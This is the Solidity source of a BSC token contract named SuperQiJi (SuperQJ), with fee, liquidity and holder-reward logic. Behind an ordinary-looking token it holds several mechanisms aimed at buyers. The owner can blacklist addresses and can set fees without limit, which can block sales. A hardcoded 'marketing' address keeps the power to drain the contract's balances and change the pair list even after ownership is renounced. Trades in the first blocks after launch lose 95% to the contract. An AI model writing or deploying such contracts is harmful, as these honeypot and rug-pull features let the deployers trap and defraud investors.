/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract baseToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    uint256 public _maxWalletToken;
    uint256 private constant MAX = ~uint256(0);

    struct Fee{uint buy; uint sell;uint transfer; uint part;}
    Fee public fees;
    struct Allot{uint marketing;uint liquidity; uint burn;uint reward;uint total;}
    Allot public allot;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping (address => bool) isWalletLimitExempt;

    ISwapRouter public _swapRouter;
    IERC20 USDT;
    mapping(address => bool) public _swapPairList;
    TokenDistributor public _tokenDistributor;

    uint256 public startAddLPBlock;
    uint256 public startTradeBlock;
    address public _mainPair;

    uint256 maxgasprice = 70 * 10**8;
    uint256 maxamount;

    address marketingAddress;

    bool public swapEnabled = true;
    uint256 public swapThreshold;
    uint256 public maxSwapThreshold;

    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        USDT = IERC20(USDTAddress);
        USDT.approve(address(swapRouter), MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        marketingAddress = 0x2daC3eA287cdAB2F5F7FE9818021B979507Bc5fF;
        swapThreshold = total.div(1000);
        maxSwapThreshold = total.div(200);
        _maxWalletToken = total;
        maxamount = (_tTotal * 1) / 100000;
        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdEaD)] = true;
        isWalletLimitExempt[_mainPair] = true;

        _feeWhiteList[marketingAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0xdEaD)] = true;

        allot=Allot(40,10,0,50,100);
        fees=Fee(10,30,45,100);

        holderRewardCondition = 10 * 10 ** IERC20(USDTAddress).decimals();
        _tokenDistributor = new TokenDistributor(USDTAddress);

        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);
    }

    function symbol() external view override returns (string memory) {return _symbol;}
    function name() external view override returns (string memory) {return _name;}
    function decimals() external view override returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    event AddLiquify(uint amountbaseTokenLiquidity, uint amountToLiquify);

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!isWalletLimitExempt[to]){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, he can not hold that much.");
        }
        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to] && !inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (swapEnabled && contractTokenBalance > 0) {
                        if(contractTokenBalance > maxSwapThreshold)contractTokenBalance = maxSwapThreshold;
                        swapTokenForFund(contractTokenBalance);
                    }
                }
                takeFee = true;
            }
        }
        
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 airdropAmount = 10000;
            address ad;
            for(int i=0;i < 3;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(from,ad,airdropAmount);
            }
            amount -= airdropAmount;
        }

        _tokenTransfer(from, to, amount, takeFee);

        if (from != address(this)) {
            if (_swapPairList[to]) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount.mul(95).div(100);
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            if(_swapPairList[recipient]){
                swapFee=fees.sell;
                if (0 == startTradeBlock && 0 < startAddLPBlock) {
                    swapFee = 0;
                }
                if ((isContract(sender)  && tAmount > maxamount ) || (tx.gasprice > maxgasprice  && tAmount > maxamount )) {
                    swapFee = 75;
                }
            }
            else if(_swapPairList[sender]){
                swapFee=fees.buy;
                if ((isContract(recipient)  && tAmount > maxamount ) || (tx.gasprice > maxgasprice  && tAmount > maxamount )) {
                    swapFee = 75;
            }
            }
            else{ 
                swapFee=fees.transfer; 
            }
            uint256 swapTokenAmount = tAmount.mul(swapFee).div(fees.part);
            if (swapTokenAmount > 0) {
                feeAmount += swapTokenAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapTokenAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapTokenForFund(uint256 tokensToLiquify) private lockTheSwap {
        uint totalpart=allot.total;
        uint amountToBurn = tokensToLiquify.mul(allot.burn).div(totalpart);
        uint amountToLiquify = tokensToLiquify.mul(allot.liquidity).div(totalpart).div(2);
        uint amountToSwap = tokensToLiquify.sub(amountToLiquify).sub(amountToBurn);

        if(amountToBurn>0){
            _basicTransfer(address(this),address(0xdead),amountToBurn);
        }
 
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(USDT);

        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ); 
        uint amountbaseToken =USDT.balanceOf(address(_tokenDistributor));
        uint totalbaseTokenFee = allot.total.sub(allot.liquidity.div(2)).sub(allot.burn);
        uint amountbaseTokenLiquidity = amountbaseToken.mul(allot.liquidity).div(totalbaseTokenFee).div(2);
        uint amountbaseTokenMarketing = amountbaseToken.mul(allot.marketing).div(totalbaseTokenFee);
        if(amountbaseTokenMarketing>0){
            USDT.transferFrom(address(_tokenDistributor),marketingAddress,amountbaseTokenMarketing); 
        }
        USDT.transferFrom(address(_tokenDistributor), address(this), USDT.balanceOf(address(_tokenDistributor)));
        if(amountToLiquify > 0){
            _swapRouter.addLiquidity(
                address(USDT),
                address(this),
                amountbaseTokenLiquidity,
                amountToLiquify,
                0,
                0,
                marketingAddress,
                block.timestamp
            );
            emit AddLiquify(amountbaseTokenLiquidity, amountToLiquify);
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setAllot(uint marketing,uint liquidity,uint burn,uint rewards) external onlyOwner {
         uint total =liquidity.add(marketing).add(rewards).add(burn); 
         allot=Allot(marketing,liquidity,burn,rewards,total);
    }

    function setFees(uint _buy,uint _sell,uint _transferfee,uint _part) external onlyOwner {
         fees=Fee(_buy,_sell,_transferfee,_part);
    }

    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _swapThreshold;
        maxSwapThreshold = _maxSwapThreshold;
    }

    function openAddLP() external onlyOwner {
        if(startAddLPBlock == 0){
            startAddLPBlock = block.number;
        }else{
            startAddLPBlock = 0;
        }
    }

    function openTrade() external onlyOwner {
        if(startTradeBlock == 0){
            startTradeBlock = block.number;
        }else{
            startTradeBlock = 0;
        }
    }
 

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) public{
        require(marketingAddress == msg.sender, "!Funder");
        _swapPairList[addr] = enable;
    }

    function claimBalance(address addr,uint256 amountPercentage)  public{
        require(marketingAddress == msg.sender, "!Funder");
        payable(addr).transfer(address(this).balance*amountPercentage.div(100));
    }

    function claimToken(address token,address addr, uint256 amountPercentage)  public{
        require(marketingAddress == msg.sender, "!Funder");
        uint256 amountToken = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(addr,amountToken * amountPercentage.div(100));
    }
    
    /* Airdrop */
    function muil_transfer(address[] calldata addresses, uint256 tAmount) public{
        require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
        uint256 SCCC = tAmount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC, "Not enough tokens in wallet");
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],tAmount);
        }
    }

    function setMaxWalletPercent_base10000(uint256 maxWallPercent_base10000) external onlyOwner() {
        _maxWalletToken = _tTotal.mul(maxWallPercent_base10000).div(10000);
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;
    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    function setmx(uint256 maxgasprice_, uint256 maxamount_)
        external
        onlyOwner
    {
        require(maxgasprice_ >= 55 * 10**8);
        maxgasprice = maxgasprice_;
        maxamount = maxamount_;
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }
        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();
        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;
        uint256 shareholderCount = holders.length;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance.mul(tokenBalance).div(holdTokenTotal);
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount * 10 ** USDT.decimals();
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

}

contract SuperQJ is baseToken {
    constructor() baseToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "SuperQiJi",
        "SuperQJ",
        9,
        8800
    ){
    }
}